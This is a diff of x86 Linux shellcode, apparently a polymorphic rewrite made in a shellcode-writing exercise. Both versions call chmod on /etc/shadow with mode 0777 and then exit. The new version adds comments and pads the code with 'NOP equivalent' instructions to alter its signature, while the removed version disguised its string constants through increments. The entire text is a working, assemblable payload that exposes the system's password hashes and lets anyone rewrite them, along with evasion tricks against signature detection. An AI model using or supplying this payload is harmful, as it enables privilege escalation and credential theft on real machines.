@@ -4,31 +4,28 @@ global _start
 
 _start:
 
-std
-xor eax, eax
-push eax
-cdq
-mov al, 0xf
+std                ; NOP Equivalent.
 
-mov esi, 0x776f6460
-nop
-inc esi
+xor eax, eax       ; Zeroes out EAX.
+cdq                ; Zeroes out EDX.
+push edx           ; Pushes the dword of EDX (0x00000000).
+mov al, 0xf        ; Moves value of syscall chmod into AL.
 
-mov edi, 0x68732f62
-inc edi
-clc
+sahf               ; NOP Equivalent.
+push 0x776f6461    ; woda
 
-mov edx, 0x74652f2e
-inc edx
-cmc
+cld                ; NOP Equivalent.
+push 0x68732f63    ; hs/c
 
-push esi
-push edi
-stc
-push edx
+push 0x74652f2f    ; te//
+cdq                ; NOP Equivalent.
 
-mov ebx, esp
-mov cx, 0x1fe
-inc ecx
-cmc
-int  0x80
+mov ebx, esp       ; Copies value from ESP to EBX.
+pushfd             ; NOP Equivalent.
+mov cx, 0x1ff      ; Value that means in octal "0777".
+cmc                ; NOP Equivalent.
+int  0x80          ; Call to kernel.
+
+inc eax            ; Increment EAX to 1, value for syscall exit().
+pushfd             ; NOP Equivalent.
+int 0x80           ; Call to kernel.
